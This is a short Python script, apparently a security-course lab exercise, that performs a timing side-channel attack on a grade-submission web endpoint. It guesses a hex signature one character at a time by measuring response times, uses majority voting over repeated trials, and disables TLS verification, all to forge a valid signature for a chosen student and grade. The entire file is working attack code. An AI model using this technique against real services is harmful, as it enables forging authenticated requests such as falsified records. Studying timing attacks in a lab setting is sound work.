import requests

def send(name, grade, signature):
    url = 'https://eitn41.eit.lth.se:3119/ha4/addgrade.php?name={}&grade={}&signature={}'.format(name, grade, signature)
    return requests.get(url, verify=False)

def find_best_char(name, grade, prev_chars):
    maxval = 0
    currentchar = ''
    for char in '0123456789abcdef':
        val = send(name, grade, prev_chars + char).elapsed.microseconds
        if val > maxval:
            maxval = val
            currentchar = char
    return currentchar

def simulate(name, grade):
    signature = ''
    while len(signature) < 20:
        temp = []
        for i in range(5):
            temp.append(find_best_char(name, grade, signature))
        signature += most_frequent(temp)
    return signature

def most_frequent(List):
    return max(set(List), key = List.count)

print(simulate("Kalle", 5))
